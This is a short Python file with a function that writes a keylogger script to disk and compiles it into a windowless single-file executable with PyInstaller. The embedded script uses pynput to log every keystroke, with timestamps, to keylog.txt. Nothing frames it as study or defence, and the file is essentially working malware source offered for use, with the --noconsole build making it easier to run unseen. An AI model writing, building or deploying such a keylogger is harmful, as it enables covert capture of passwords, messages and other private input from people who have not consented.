import subprocess

def create_file():
    """
    Creates a text file with a predefined filename and content.

    Returns:
        tuple: A tuple containing a boolean (True for success, False for failure)
               and a string message.
    """
    filename = "Keylogger.py"
    content = '''import pynput
from pynput.keyboard import Key, Listener
import logging

# Configure logging to a file
log_dir = ""  # Current directory
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

print("Keylogger started. Press 'Esc' to stop.")

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
'''

    try:
        with open(filename, "w") as f:
            f.write(content)
        print(f"File '{filename}' created successfully. Attempting to compile with PyInstaller...")

        try:
            # Check if pyinstaller is installed
            subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            return True, f"File '{filename}' created. PyInstaller not found or not installed. Please install it using 'pip install pyinstaller' to compile the executable."

        # Run pyinstaller
        command = ["pyinstaller", "--onefile", "--noconsole", filename]
        try:
            process = subprocess.run(command, check=True, capture_output=True, text=True)
            print("PyInstaller output:")
            print(process.stdout)
            if process.stderr:
                print("PyInstaller errors/warnings:")
                print(process.stderr)
            return True, f"File '{filename}' created and compiled into an executable successfully."
        except subprocess.CalledProcessError as e:
            print(f"PyInstaller failed with error: {e}")
            print("PyInstaller stdout:")
            print(e.stdout)
            print("PyInstaller stderr:")
            print(e.stderr)
            return False, f"Error compiling '{filename}' with PyInstaller: {e}"
    except IOError as e:
        return False, f"Error creating file: {e}"
